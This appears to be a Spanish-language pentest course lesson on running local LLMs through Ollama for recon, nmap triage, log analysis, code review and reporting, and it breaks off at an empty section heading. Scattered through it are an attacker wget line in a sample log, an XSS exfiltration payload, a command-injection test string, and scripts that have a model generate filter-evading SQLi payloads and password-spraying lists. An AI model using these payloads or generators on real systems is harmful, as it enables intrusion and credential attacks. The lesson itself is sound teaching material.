# Lección 05 — Local AI para seguridad ofensiva

Módulo 05: Arquitectura de IA, Prompt Engineering e IA Local · Penetration Testing con Kali Linux 1.0 · Red Team Leaders

## Introducción

El trabajo de seguridad ofensiva genera datos que no deben salir del límite del cliente. Documentos de scope, credenciales en las notas de scoping, allow-lists de IP, extractos de código fuente, tráfico HTTP capturado, capturas de dashboards internos: todo eso es confidencial por contrato. Mandar ese material a un large language model (LLM) hosted rompe las rules of behavior (RoB) del engagement en casi cualquier firma seria.

Al mismo tiempo, los LLM sirven de verdad durante un pentest. Agrupan listas de subdominios, resumen inundaciones de logs, traducen protocolos oscuros, redactan el texto de un finding a las 03:00 y atrapan code smells que un revisor cansado se salta. La respuesta no es abandonar la herramienta: es correrla en local.

Esta lección cubre cómo usar modelos de IA local — llama3, mistral, qwen2.5-coder, codestral y nomic-embed-text alojados en Ollama — como parte de trabajo de un penetration test autorizado. Cada workflow asume que el engagement letter está firmado, que la target list está escrita y que las rules of engagement (RoE) prohíben mandar datos del cliente a un modelo de terceros. Vamos a armar un toolkit chico de scripts en Python que puedes dejar en una VM de Kali y reutilizar entre engagements.

Al final de esta lección vas a poder elegir el modelo local correcto para una tarea dada, pasarle datos de recon y de logs, redactar PII de forma correcta y levantar una base vectorial local que responda preguntas de pentest desde tus propias notas, sin que un solo byte cruce el límite del cliente.

## 1. Usar modelos locales sobre datos confidenciales del cliente durante un engagement autorizado

Antes de escribir una línea de código, entiende el contrato que explica por qué la IA local le importa a un pentester.

### 1.1 Qué dice de verdad el engagement letter

Un Master Services Agreement (MSA) y un Statement of Work (SoW) típicos de un penetration test contienen al menos tres cláusulas que tocan la IA:

- Cláusula de confidencialidad. Todos los datos obtenidos durante el engagement son información confidencial del cliente. Divulgarlos a cualquier tercero sin consentimiento escrito es un incumplimiento de contrato.
- Cláusula de manejo de datos. Los datos de la evaluación tienen que almacenarse en medios cifrados, transmitirse solo por canales aprobados y destruirse al final del período de retención.
- Cláusula de subprocesador. Cualquier servicio de terceros que procese datos del cliente tiene que estar listado y aprobado de antemano.

Un provider de LLM hosted — OpenAI, Anthropic, Google, Mistral La Plateforme — es un subprocesador. Pegar el código fuente de un cliente en una ventana de chat hosted sin un data processing agreement (DPA) aprobado es, técnica y legalmente, un evento de divulgación de datos. Algunos clientes ya incluyen en sus RoE una cláusula explícita de "sin IA de terceros".

### 1.2 Qué significa local

"Local" en esta lección significa que los pesos del modelo, el motor de inferencia, el prompt y la completion nunca tocan la red. El workflow se ve así:

```text
┌──────────────────────────────────────────────────────────────┐
│ VM de Kali (red de engagement aislada)                       │
│                                                              │
│   ┌────────────┐   HTTP(S)   ┌──────────────────────────┐    │
│   │  tooling   │◀───────────▶│  Ollama en 127.0.0.1     │    │
│   │  Python    │             │  llama3, qwen2.5-coder   │    │
│   └────────────┘             │  nomic-embed-text        │    │
│         ▲                    └──────────────────────────┘    │
│         │                                                    │
│   ┌────────────┐                                             │
│   │ Notas del  │                                             │
│   │ engagement,│                                             │
│   │ XML nmap,  │                                             │
│   │ logs HTTP  │                                             │
│   └────────────┘                                             │
└──────────────────────────────────────────────────────────────┘
        (sin tráfico saliente hacia ningún provider de IA)
```

Ollama bindea a `127.0.0.1:11434` por defecto. Confírmalo con `ss -tlnp | grep 11434` antes de que salga el primer prompt.

### 1.3 Setup de baseline

El resto de esta lección asume que lo siguiente está instalado en tu caja de Kali:

```bash
# Instalar Ollama (Linux):
curl -fsSL https://ollama.com/install.sh | sh

# Verificar que escucha solo en localhost:
ss -tlnp | grep 11434
# LISTEN 0 4096 127.0.0.1:11434 0.0.0.0:*

# Bajar los modelos que usa esta lección:
ollama pull llama3:8b
ollama pull mistral:7b
ollama pull qwen2.5-coder:7b
ollama pull codestral:22b        # si tienes >= 16 GB de VRAM
ollama pull nomic-embed-text

# Lado Python:
python3 -m venv ~/venvs/pentest-ai
source ~/venvs/pentest-ai/bin/activate
pip install ollama chromadb requests lxml rich python-dateutil
```

> **Pentester Insight:** Antes de cualquier engagement, corre `sudo iptables -A OUTPUT -o eth0 -p tcp --dport 443 -d api.openai.com -j REJECT` (y los equivalentes para otros providers). Es un control de cinturón y tirantes contra un plugin perdido de VS Code o un autocomplete de shell que filtre datos. Si tu tooling empieza a fallar de golpe, sabes que un subproceso estaba por llamar a casa.

## 2. Elegir el modelo correcto por tarea

No hay un único modelo local "mejor". El ajuste a la tarea importa más que el conteo de parámetros. La tabla de abajo refleja modelos que corren bien en una workstation de 16 a 32 GB de RAM a principios de 2026.

### 2.1 Matriz de modelo a tarea

| Tarea | Modelo recomendado | Por qué |
|---|---|---|
| Review de código fuente, caza de sinks | `qwen2.5-coder:7b`, `codestral:22b` | Entrenados en código, entienden taint sinks, manejan varios lenguajes |
| Análisis de logs, resumen de incidentes | `mistral:7b`, `llama3:8b` | Buen resumen, siguen prompts estructurados |
| Extracción estructurada (JSON de salida) | `llama3:8b` con `format=json` | El modo JSON nativo impone el schema |
| Clustering de recon (subdominios, IOC) | `llama3:8b` | Razonable agrupando, barato para batches grandes |
| Redacción de reports | `llama3:8b`, `mistral:7b` | Produce Markdown usable |
| Embeddings | `nomic-embed-text` | 768 dimensiones, rápido, hecho para eso |
| Triage rápido / clasificación | `phi3:mini`, `llama3.2:3b` | Chicos, ~30 tok/s en CPU |

### 2.2 Un chequeo rápido de sanidad

```python
# ~/pentest-ai/model_probe.py
import ollama, time, textwrap

PROMPT = "En una oración, ¿qué es un taint sink en application security?"

for model in ["llama3:8b", "mistral:7b", "qwen2.5-coder:7b"]:
    t0 = time.time()
    resp = ollama.generate(model=model, prompt=PROMPT,
                           options={"num_predict": 80})
    dt = time.time() - t0
    print(f"\n=== {model} ({dt:.1f}s) ===")
    print(textwrap.fill(resp["response"].strip(), width=78))
```

Corre esto una vez cuando armes una laptop nueva o actualices un modelo. La latencia y la calidad de la respuesta varían lo bastante entre versiones menores como para que importe.

### 2.3 Elegir por la forma del prompt, no por el nombre de la tarea

Empareja el modelo con la forma del prompt:

- Contexto largo + resumir → `mistral:7b` (bueno comprimiendo)
- Contexto corto + un objeto JSON de salida → `llama3:8b` con `format=json`
- Código de entrada, código de salida → `qwen2.5-coder:7b`
- Retrieval difuso / embeddings → `nomic-embed-text`
- Razonamiento de varios pasos → `llama3:8b` (un mistral de 7B puede perder el hilo)

> **Pentester Insight:** Nunca dejes que el modelo elija el modelo. Déjalo hard-codeado en el script. Durante un engagement quieres output determinista entre corridas, para que un re-run del triage de ayer produzca los mismos clusters. Cambiar el modelo del día rompe la reproducibilidad, y el cliente va a preguntar por eso.

## 3. Workflow de recon — pasar Amass a un modelo local

El output de enumeración de subdominios es una de las ganancias más fáciles para la IA local. Una corrida de `amass enum -d example.com` produce cientos o miles de hostnames. Agruparlos por patrón (staging frente a producción, región, línea de producto, tech stack probable) acelera la selección de targets.

### 3.1 Agrupar el output de Amass

Asume que corriste `amass enum -passive -d example.com -o amass.txt` bajo un engagement autorizado.

```python
# ~/pentest-ai/recon_cluster.py
import ollama, json, sys, pathlib

PROMPT = """Ayudas a un pentester (engagement autorizado e in scope) a agrupar subdominios de un target.

Dada la lista de subdominios de abajo, agrúpalos en clusters. Cada cluster debe incluir:
  - "label": nombre corto y legible (por ejemplo "staging", "infra de mail", "vendor SaaS")
  - "reason": una oración
  - "hosts": array de hostnames tomados del input

Devuelve solo JSON válido. Sin prosa. Schema:
{"clusters":[{"label":"...","reason":"...","hosts":["..."]}]}

Subdominios:
%s
"""

def cluster(path):
    hosts = pathlib.Path(path).read_text().splitlines()
    hosts = sorted(set(h.strip() for h in hosts if h.strip()))
    resp = ollama.generate(
        model="llama3:8b",
        prompt=PROMPT % "\n".join(hosts),
        format="json",
        options={"temperature": 0.1, "num_ctx": 8192},
    )
    data = json.loads(resp["response"])
    return data

if __name__ == "__main__":
    result = cluster(sys.argv[1])
    for c in result["clusters"]:
        print(f"\n== {c['label']} ({len(c['hosts'])} hosts) ==")
        print(f"   {c['reason']}")
        for h in c["hosts"][:10]:
            print(f"   - {h}")
        if len(c["hosts"]) > 10:
            print(f"   ... y {len(c['hosts']) - 10} más")
```

Invocación y output de muestra sobre un set de prueba chico:

```text
$ python3 recon_cluster.py amass.txt

== Mail corporativo (5 hosts) ==
   Infraestructura estándar de mail corporativo.
   - mail.example.com
   - mx1.example.com
   - mx2.example.com
   - autodiscover.example.com
   - spf.example.com

== Staging / no producción (12 hosts) ==
   Los nombres contienen "staging", "dev", "qa" o puertos no estándar implicados por un wildcard.
   - staging.example.com
   - dev-api.example.com
   ...
```

### 3.2 Extraer IOC de un dump de OSINT

Para digerir un feed de OSINT, extrae IOC estructurados para empujarlos directo a MISP o a una planilla:

```python
# ~/pentest-ai/osint_ioc.py
import ollama, json, sys

PROMPT = """Extraes indicators of compromise (IOC) de un dump de OSINT para un engagement de red team autorizado. Devuelve JSON con estos arrays:
  ips, domains, hashes_md5, hashes_sha1, hashes_sha256, urls, emails, cves

Incluye solo valores que aparezcan literalmente en el input. No inventes.

Input:
%s
"""

def extract(text):
    resp = ollama.generate(
        model="llama3:8b",
        prompt=PROMPT % text,
        format="json",
        options={"temperature": 0.0, "num_ctx": 8192},
    )
    return json.loads(resp["response"])

if __name__ == "__main__":
    data = sys.stdin.read()
    iocs = extract(data)
    for k, v in iocs.items():
        print(f"{k}: {len(v)}")
        for item in v[:5]:
            print(f"  {item}")
```

Mete un trozo de un post, un threat report o un extracto de pastebin por stdin y el script imprime IOC estructurados. Temperature en cero y el modo JSON juntos eliminan casi por completo los indicadores alucinados.

### 3.3 Qué no hacer

No mandes el output de Amass del cliente a un LLM hosted. Incluso una "lista de subdominios" revela infraestructura que el cliente no publicó (entornos de staging, targets de una adquisición, nombres de productos que vienen). Si no lo pegarías en un foro público, no lo pegues en un chat hosted.

## 4. Triage de output de nmap — priorizar hosts por riesgo del servicio

Un nmap externo de un /22 produce XML con cientos de hosts. No todos merecen la misma atención. Un modelo local puede leer el XML y rankear hosts por blast radius probable, para que ataques primero los interesantes.

### 4.1 Parsear XML de nmap

```python
# ~/pentest-ai/nmap_triage.py
import ollama, json, sys
from lxml import etree
from rich.table import Table
from rich.console import Console

PROMPT = """Haces triage de resultados de nmap para un penetration test externo AUTORIZADO.

Por cada host de abajo, devuelve un objeto JSON con:
  "ip", "priority" (1=la más alta, 5=la más baja), "reason" (una oración),
  "next_step" (herramienta o chequeo específico).

Prioriza:
  - Protocolos de management expuestos (SSH, RDP, WinRM, SMB)
  - Servicios legacy o sin parche (Apache viejo, IIS, exim, etc.)
  - Bases de datos expuestas a internet
  - Cualquier cosa con un banner por defecto

Devuelve solo un array JSON. Hosts:
%s
"""

def parse_nmap(path):
    tree = etree.parse(path)
    hosts = []
    for h in tree.xpath("//host[status/@state='up']"):
        addr = h.find("address").get("addr")
        ports = []
        for p in h.xpath(".//port[state/@state='open']"):
            portid = p.get("portid")
            proto = p.get("protocol")
            svc = p.find("service")
            name = svc.get("name") if svc is not None else "?"
            product = svc.get("product") if svc is not None else ""
            version = svc.get("version") if svc is not None else ""
            ports.append(f"{portid}/{proto} {name} {product} {version}".strip())
        if ports:
            hosts.append({"ip": addr, "ports": ports})
    return hosts

def triage(hosts):
    text = "\n".join(f"{h['ip']}: " + ", ".join(h["ports"]) for h in hosts)
    resp = ollama.generate(
        model="llama3:8b",
        prompt=PROMPT % text,
        format="json",
        options={"temperature": 0.1, "num_ctx": 8192},
    )
    return json.loads(resp["response"])

def render(items):
    tbl = Table(title="Triage de nmap")
    for col in ("Prioridad", "IP", "Razón", "Siguiente paso"):
        tbl.add_column(col)
    for i in sorted(items, key=lambda x: x.get("priority", 5)):
        tbl.add_row(str(i.get("priority")), i.get("ip", ""),
                    i.get("reason", ""), i.get("next_step", ""))
    Console().print(tbl)

if __name__ == "__main__":
    hosts = parse_nmap(sys.argv[1])
    print(f"Se parsearon {len(hosts)} hosts vivos")
    result = triage(hosts)
    # Algunos modelos envuelven el array en un objeto; desenvuelve.
    items = result if isinstance(result, list) else next(iter(result.values()))
    render(items)
```

Output de muestra:

| Prioridad | IP | Razón |
|---|---|---|
| 1 | 10.10.5.14 | MSSQL 2008 expuesto a internet (2433/tcp) |
| 1 | 10.10.6.7 | SMB 445/tcp con signing no requerido |
| 2 | 10.10.5.20 | Apache 2.2.15, EOL y con CVE conocidos |
| 3 | 10.10.6.4 | HTTPS estándar, versión actual |

### 4.2 Disciplina de reproducibilidad

Guarda el prompt exacto y la respuesta JSON cruda junto al output del triage. Cuando vuelvas a correr mañana con un nmap actualizado, puedes hacer diff contra la última corrida para ver qué cambió. `format="json"` más `temperature=0.0` da outputs casi deterministas, pero no perfectamente deterministas: conserva siempre el texto crudo.

### 4.3 Partir scans grandes en chunks

Si el XML representa más o menos más de 60 a 100 hosts, vas a desbordar `num_ctx`. Parte por /24:

```python
def chunk(hosts, n=40):
    for i in range(0, len(hosts), n):
        yield hosts[i:i+n]

all_items = []
for batch in chunk(hosts):
    all_items.extend(triage(batch))
```

El modelo no necesita conocimiento entre chunks para el triage: cada host se puntúa de forma independiente.

## 5. Workflow de análisis de logs

A menudo recibes acceso a un syslog de staging, un log de WAF o un log chico de IIS para cazar indicadores que le importan al cliente. Un modelo local resume un snippet rápido y saca a la superficie los intentos de intrusión que un humano terminaría encontrando.

### 5.1 Un ejemplo que funciona

```python
# ~/pentest-ai/log_summary.py
import ollama, sys

PROMPT = """Analizas un snippet crudo de syslog durante un ejercicio purple-team autorizado. Resume:
  1. Qué pasó, en lenguaje llano.
  2. IP del atacante, herramientas y técnicas (mapea a MITRE ATT&CK donde sea obvio).
  3. Qué líneas del log son la evidencia más fuerte (cítalas exactamente).
  4. Qué deberían hacer después los defensores.

Formato Markdown con encabezados. Las citas de líneas, verbatim.

Log:
%s
"""

def summarize(text):
    resp = ollama.generate(
        model="mistral:7b",
        prompt=PROMPT % text,
        options={"temperature": 0.2, "num_ctx": 8192},
    )
    return resp["response"]

if __name__ == "__main__":
    print(summarize(sys.stdin.read()))
```

Input de ejemplo (un brute-force de SSH seguido de una auth exitosa):

```text
Mar 12 03:14:07 web01 sshd[2331]: Failed password for root from 45.9.148.203 port 51241
Mar 12 03:14:09 web01 sshd[2331]: Failed password for root from 45.9.148.203 port 51241
Mar 12 03:14:11 web01 sshd[2333]: Failed password for admin from 45.9.148.203 port 51244
Mar 12 03:14:14 web01 sshd[2335]: Failed password for oracle from 45.9.148.203 port 51247
Mar 12 03:14:16 web01 sshd[2335]: Failed password for postgres from 45.9.148.203 port 51247
Mar 12 03:14:20 web01 sshd[2337]: Accepted password for jenkins from 45.9.148.203 port 51253
Mar 12 03:14:22 web01 sudo[2345]: jenkins : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/wget http://45.9.148.203/kt.sh
```

Output de muestra (abreviado):

```markdown
## Resumen
Un host externo en 45.9.148.203 hizo un password-spray de SSH contra web01,
después autenticó con éxito como `jenkins` y de inmediato usó sudo para traer
un script desde la misma IP por HTTP en claro.

## Atacante
- IP: 45.9.148.203
- Técnica: T1110.003 Password Spraying, T1105 Ingress Tool Transfer

## Evidencia más fuerte
- `Accepted password for jenkins from 45.9.148.203`
- `sudo ... COMMAND=/usr/bin/wget http://45.9.148.203/kt.sh`

## Próximos pasos del defensor
1. Aísla web01 y toma un snapshot para forense.
2. Rota la credencial de jenkins y audita sus derechos de sudo.
3. Bloquea 45.9.148.203 en el perímetro y caza la misma IP en otros logs.
```

### 5.2 Streaming para logs largos

Para el triage interactivo de un log más largo, streamea los tokens para poder hacer Ctrl-C cuando ya tengas bastante:

```python
for chunk in ollama.generate(
    model="mistral:7b",
    prompt=PROMPT % log_text,
    options={"num_ctx": 16384},
    stream=True,
):
    print(chunk["response"], end="", flush=True)
```

### 5.3 Cuándo no resumir

No te apoyes en el modelo como fuente de verdad para números ("¿cuántos logins fallidos?"). Cuenta con `grep -c` y pasa el conteo como contexto; después deja que el modelo narre. Los LLM cuentan mal cuando la muestra es densa; narran bien cuando el conteo ya está hecho.

## 6. Análisis de respuestas HTTP

Durante un test de aplicación web acumulas transacciones HTTP capturadas desde Burp, mitmproxy o `curl -v`. Un modelo local puede identificar el tech stack y sugerir clases de bugs que vale la pena perseguir.

### 6.1 Alimentar una transacción capturada

```python
# ~/pentest-ai/http_analyze.py
import ollama, sys, pathlib

PROMPT = """Ayudas a un pentester (engagement autorizado) a analizar una transacción HTTP capturada. Identifica:
  1. Tech stack probable del lado servidor (lenguaje, framework, server, CDN, WAF)
  2. Mecanismo de sesión o de auth
  3. Headers interesantes y qué implican
  4. Las 5 clases de vulnerabilidad que más vale la pena probar en este endpoint, rankeadas
  5. Primeros requests concretos a enviar (estilo curl) para cada clase de vuln

Sé específico. No repitas el input. Devuelve Markdown.

Transacción:

%s
"""

def analyze(text):
    resp = ollama.generate(
        model="llama3:8b",
        prompt=PROMPT % text,
        options={"temperature": 0.2, "num_ctx": 8192},
    )
    return resp["response"]

if __name__ == "__main__":
    text = pathlib.Path(sys.argv[1]).read_text()
    print(analyze(text))
```

Dado un par request/response contra `POST /api/v1/orders` que devuelve `X-Powered-By: Express`, `Set-Cookie: connect.sid=...` y un cuerpo JSON, el modelo identifica con bastante confiabilidad Node/Express, cookies de sesión, y sugiere IDOR sobre el ID de la orden, NoSQL injection en el payload JSON, prototype pollution vía `__proto__`, mass assignment en campos ocultos, y problemas de auth adyacentes a JWT si hay un bearer token.

### 6.2 Redacta primero

Los cuerpos de respuesta a menudo contienen PII. La sección 11 cubre la redacción; córrela antes de que el analizador vea la transacción.

### 6.3 Una transacción por vez

Alimentar un export entero de Burp de una sola vez produce output vago. Alimenta una transacción interesante, obtén un análisis interesante, decide qué probar y sigue. El ancho de banda útil de un LLM es estrecho, pero profundo.

## 7. Review de código fuente — pasar un repo chico por un modelo coder local

Las evaluaciones de código fuente son uno de los usos de más valor de un modelo coder local. `qwen2.5-coder:7b` y `codestral:22b` están entrenados en código y se portan mucho mejor que los modelos de propósito general de 7B en la caza de sinks.

### 7.1 Acotar la review

Para cualquier cosa más grande que un repo chico, no pegues el árbol entero. Filtra a los archivos con más chance de contener sinks:

```bash
# Archivos que tocan sinks peligrosos (ejemplo JS):
grep -rIln -E 'eval\(|Function\(|child_process|execSync|new Function|dangerouslySetInnerHTML|res\.send\(' src/ > candidates.txt

# O para Python:
grep -rIln -E 'os\.system|subprocess\.|pickle\.loads|yaml\.load\(|eval\(|exec\(' src/ > candidates.txt
```

### 7.2 El script de caza de sinks

```python
# ~/pentest-ai/sink_hunter.py
import ollama, json, pathlib, sys

PROMPT = """Eres un code reviewer con foco en seguridad para una evaluación de código fuente AUTORIZADA.

Lee el archivo y devuelve JSON con un array de findings. Cada finding:
  "line": int, "sink": string, "why": razón de una oración,
  "class": una de ["command-injection","sql-injection","xss","ssrf","path-traversal","deserialization","xxe","open-redirect","auth-bypass","crypto","other"],
  "confidence": una de ["low","medium","high"]

No inventes líneas. Si no hay nada sospechoso, devuelve {"findings":[]}.

Archivo: %s
Contenido:

%s
"""

def review_file(path):
    src = pathlib.Path(path).read_text(errors="ignore")
    if len(src) > 40_000:
        return {"findings": [], "note": "archivo demasiado grande; pártelo primero"}
    resp = ollama.generate(
        model="qwen2.5-coder:7b",
        prompt=PROMPT % (path, src),
        format="json",
        options={"temperature": 0.0, "num_ctx": 16384},
    )
    return json.loads(resp["response"])

if __name__ == "__main__":
    for p in sys.argv[1:]:
        print(f"\n=== {p} ===")
        r = review_file(p)
        for f in r.get("findings", []):
            print(f"  L{f['line']:>4} [{f['class']:<20}] "
                  f"({f['confidence']}) {f['sink']} -- {f['why']}")
```

### 7.3 Verifica a mano

El modelo produce pistas, no prueba. Un finding como este:

```text
L 82 [command-injection] (high) subprocess.run(f"tar xf {path}", shell=True)
   -- `path` no confiable llega al shell sin quoting
```

es una pista. Recorre el código:

- ¿`path` es de verdad no confiable? Síguelo hasta el input.
- ¿Hay un chequeo antes (whitelist, resolución con pathlib)?
- Reprodúcelo en un REPL con un payload como `x; id > /tmp/pwn`.
- Márcalo exploitable solo cuando tengas un PoC que funcione.

Los falsos positivos del LLM en la caza de sinks rondan el 30 al 60 por ciento en la práctica. Trata cada finding de confidence alta como no verificado hasta que hayas hecho pasar un payload.

### 7.4 Procesar un directorio en batch

```python
import pathlib, subprocess
for p in pathlib.Path("src").rglob("*.py"):
    if p.stat().st_size < 40_000:
        subprocess.run(["python3", "sink_hunter.py", str(p)])
```

Modelo local, repo local: ningún fuente sale de la caja.

## 8. Generación de wordlists y payloads

A veces vas a querer una wordlist hecha a medida de un parser, un endpoint o una empresa. Los modelos locales pueden generarlas sin que le cuentes a un tercero qué estás atacando.

### 8.1 Payloads de SQLi a medida de un parser

Supón que determinaste que el target usa sqlx con PostgreSQL y rechaza payloads que contienen `--` o `#`. Pídele al modelo local variantes conscientes del parser, siempre contra un target autorizado, y siempre con el modelo advertido de que los payloads son para un test autorizado:

```python
# ~/pentest-ai/sqli_variants.py
import ollama

PROMPT = """Ayudas a un pentester en un engagement AUTORIZADO.

Target: PostgreSQL vía el driver sqlx de Rust; NO se usan prepared statements para el
parámetro de query `sort`. El filtro rechaza `--`, `#`, `/*` y cualquier `union` en
cualquier combinación de mayúsculas. La respuesta es JSON con el error SQL crudo
embebido cuando falla.

Genera 20 payloads de SQL injection que:
  - eviten los substrings rechazados,
  - usen trucos específicos de PostgreSQL (`::text`, `pg_sleep`, `->>`, `INFORMATION_SCHEMA`),
  - incluyan variantes boolean-based, time-based y error-based.

Devuelve un payload por línea, sin comentario.
"""

resp = ollama.generate(model="qwen2.5-coder:7b", prompt=PROMPT,
                      options={"temperature": 0.4, "num_predict": 800})
print(resp["response"])
```

### 8.2 Listas de contraseñas a medida del dominio

Las listas de contraseñas para un target específico — usando info pública de la empresa como nombres de marca, nombres de producto y el año — también van en el modelo local. No pegues nombres de empleados ni la jerga interna del cliente en un modelo hosted.

```python
# ~/pentest-ai/pw_list.py
import ollama, sys

PROMPT = """Ayudas a un pentester en un engagement AUTORIZADO a armar
una lista candidata de contraseñas para una campaña de spraying.

Contexto de la empresa (solo info pública):
%s

Genera 100 candidatos realistas de contraseña. Reglas:
  - largo >= 8
  - incluye: BrandYear!, BrandYear#, Season+Year!, ProductLine1!
  - incluye sustituciones l33t de la marca
  - incluye variantes 2024/2025/2026
  - NUNCA emitas nombres de personas reales que se entreguen acá

Devuelve uno por línea, sin comentario.
"""

ctx = sys.stdin.read()
print(ollama.generate(model="llama3:8b", prompt=PROMPT % ctx,
                     options={"temperature": 0.5, "num_predict": 1200})["response"])
```

### 8.3 Guardrails legales y éticos

Dos reglas duras:

- Cada payload generado es solo para el target del cliente. No guardes "la lista que armé para Acme" en una herramienta global. Borra las listas al cierre del engagement, junto con el resto de la evidencia.
- No generes malware. Los modelos locales van a producir con gusto un one-liner de reverse shell en la mayoría de los lenguajes. Eso puede tener lugar como stager durante un engagement de red team autorizado, y no está bien empaquetarlo como herramienta de propósito general. Mantén los outputs dentro del engagement.

## 9. Redacción del report en local

Convertir un finding crudo en una finding card decente es trabajo tedioso que un modelo local hace bien. Mantener esto en local importa porque los findings contienen capturas, URLs y pasos de reproducción que, por definición, son sensibles.

### 9.1 Template de finding card

```python
# ~/pentest-ai/finding_card.py
import ollama, sys, pathlib

TEMPLATE = """Redactas una finding card de penetration test. Llena este template
Markdown exactamente. Usa solo información de las notas CRUDAS.

# Título
_Un título corto en imperativo, por ejemplo "XSS almacenado en el campo de comentario de /forum/post"_

## Severity
_Una de: Critical / High / Medium / Low / Informational. Justifica en una oración._

## Afectados
- URL / endpoint / componente

## Descripción
_2 a 4 párrafos que expliquen qué está mal y por qué importa. Sin lenguaje de marketing._

## Reproducción
1. pasos
2. numerados
3. que un ingeniero junior podría seguir

## Impact
_Impact de negocio en el lenguaje del cliente. Exposición de datos, integridad, disponibilidad._

## Recomendación
_Específica y accionable. Cita docs del framework o de la librería si aplica._

## Referencias
- CWE-XX (si aplica)
- Link de OWASP (si aplica)

Notas crudas:
%s
"""

if __name__ == "__main__":
    notes = pathlib.Path(sys.argv[1]).read_text()
    resp = ollama.generate(model="llama3:8b", prompt=TEMPLATE % notes,
                          options={"temperature": 0.3, "num_ctx": 8192})
    print(resp["response"])
```

Alimenta un scratchpad como este:

```text
Target: https://staging.acme.corp/forum/post
Payload: <img src=x onerror=fetch('/admin/api/users')>
Resultado: se dispara para cualquier usuario que vea el post; exfil hacia un endpoint controlado por el atacante
Auth: se permite publicar sin autenticación
Notas: content-type application/x-www-form-urlencoded, sin CSP, sin encoding de output
```

Sale un primer borrador usable de finding card. Edita el tono, verifica los pasos de reproducción volviéndolos a correr y después pégalo en el report.

### 9.2 Nunca confíes en los números, nunca confíes en los nombres

- Si el modelo produce "la vulnerabilidad afecta a 3.200 cuentas", vuelve a contar tú.
- Si inventa un CWE, reemplázalo. Busca los números de CWE en la lista de CWE; no los aceptes del modelo.
- Si inventa un autor o el nombre de un equipo interno, borra la invención.

El trabajo del modelo es pulir la prosa, no producir hechos.

## 10. Embeddings y base vectorial local para buscar notas del engagement

Para la semana dos del engagement tienes una carpeta de notas: listas de subdominios, banners de servicios, curls útiles, borradores de findings a medias, minutas. Grep se pone lento y se pierde coincidencias semánticas ("aquello del JWT" cuando las notas dicen "replay del bearer token"). Un modelo local de embeddings más ChromaDB resuelve eso.

### 10.1 Ejemplo de cuarenta líneas

```python
# ~/pentest-ai/notes_index.py
import chromadb, ollama, pathlib, sys

client = chromadb.PersistentClient(path="./chroma.db")
col = client.get_or_create_collection("notes")

def embed(text: str):
    return ollama.embeddings(model="nomic-embed-text", prompt=text)["embedding"]

def index(root):
    for p in pathlib.Path(root).rglob("*.md"):
        text = p.read_text(errors="ignore")
        # Parte por párrafos.
        for i, chunk in enumerate([c for c in text.split("\n\n") if c.strip()]):
            uid = f"{p}#{i}"
            col.upsert(ids=[uid], embeddings=[embed(chunk)],
                       documents=[chunk], metadatas=[{"path": str(p)}])

def search(q, k=5):
    r = col.query(query_embeddings=[embed(q)], n_results=k)
    for doc, meta, dist in zip(r["documents"][0], r["metadatas"][0], r["distances"][0]):
        print(f"\n[{dist:.3f}] {meta['path']}")
        print(doc[:400])

if __name__ == "__main__":
    if sys.argv[1] == "index":
        index(sys.argv[2])
    elif sys.argv[1] == "search":
        search(" ".join(sys.argv[2:]))
```

Uso:

```bash
python3 notes_index.py index ~/engagements/acme/notes
python3 notes_index.py search "el truco del JWT donde alg era none"
```

`nomic-embed-text` devuelve vectores de 768 dimensiones, es rápido en CPU y entiende la jerga de seguridad lo bastante bien para recuperar notas de un engagement.

### 10.2 El storage vive con el engagement

`./chroma.db` es un directorio respaldado por SQLite. Déjalo dentro de la carpeta del engagement para que pase por el mismo workflow de retención y destrucción que el resto de las notas. No lo sincronices a iCloud, Dropbox ni un disco personal.

## 11. Manejar PII de forma correcta

Incluso con un modelo local, un manejo descuidado de PII crea problemas. Redacta antes de hacer el pipe.

### 11.1 Un filtro de redacción

```python
# ~/pentest-ai/redact.py
import re, sys

PATTERNS = [
    (re.compile(r"\b[\w.+-]+@[\w-]+\.[\w.-]+\b"), "[EMAIL]"),
    (re.compile(r"\b(?:\d[ -]?){13,19}\b"), "[PAN]"),           # tarjeta de pago
    (re.compile(r"\b\d{3}-\d{2}-\d{4}\b"), "[SSN]"),
    (re.compile(r"\b(?:\+?\d{1,2}\s?)?\(?\d{3}\)?[\s.-]?\d{3}[\s.-]?\d{4}\b"), "[PHONE]"),
    (re.compile(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b"), "[IP]"),
    (re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}"), "[JWT]"),
    (re.compile(r"(?i)(api[_-]?key|secret|token|passwd|password)\s*[:=]\s*\S+"), r"\1=[REDACTED]"),
]

def redact(text):
    for pat, repl in PATTERNS:
        text = pat.sub(repl, text)
    return text

if __name__ == "__main__":
    sys.stdout.write(redact(sys.stdin.read()))
```

Compónlo con las otras herramientas:

```bash
cat burp_export.txt | python3 redact.py | python3 http_analyze.py /dev/stdin
```

### 11.2 El modelo local no es un pase libre

Aunque el modelo corra en tu caja de Kali, la carpeta del engagement sigue siendo evidencia. No pegues un dump crudo de una base de clientes en un prompt "solo para ver qué encuentra el modelo". Redacta PII del mismo modo que lo harías antes de pegar el mismo contenido en un canal de Slack, con la misma disciplina.

### 11.3 Cuándo local sigue sin alcanzar

Para material cubierto por el artículo 9 del GDPR (salud, biométricos, datos políticos) o por HIPAA, trata el modelo local como otro proceso de la workstation. Algunos clientes no quieren ningún procesamiento con IA de esas categorías. Lee las RoE. Ante la duda, no le des el material al modelo: usa grep, herramientas y tu cabeza.

## 12. Consideraciones de latencia y throughput

Los modelos locales son más lentos que las API hosted. Puedes convertir eso en una ventaja si estructuras el workflow alrededor.

### 12.1 El patrón chico-después-grande

Corre un modelo chico sobre todo el dataset para baldear el trabajo. Después manda solo el balde de arriba al modelo grande:

```python
# Triage de 500 findings con phi3:mini, después reescribe los 40 más altos con llama3:8b.
triaged = [triage_small(f) for f in findings]
top = sorted(triaged, key=lambda x: x["score"], reverse=True)[:40]
for f in top:
    f["polished"] = polish_big(f)
```

`phi3:mini` corre a 40-80 tokens por segundo en CPU; `llama3:8b` corre a 10-30. Hacer el triage primero en el modelo chico convierte un trabajo de dos horas en diez minutos.

### 12.2 Batch reutilizando contexto

Ollama soporta mantener el modelo cargado (`keep_alive`). Ponle una duración más larga durante un job de batch:

```python
ollama.generate(model="llama3:8b", prompt=p,
                options={"keep_alive": "30m"})
```

Si no, el modelo se descarga entre llamadas y cada prompt vuelve a pagar el costo de carga (5 a 20 segundos).

### 12.3 Paralelismo

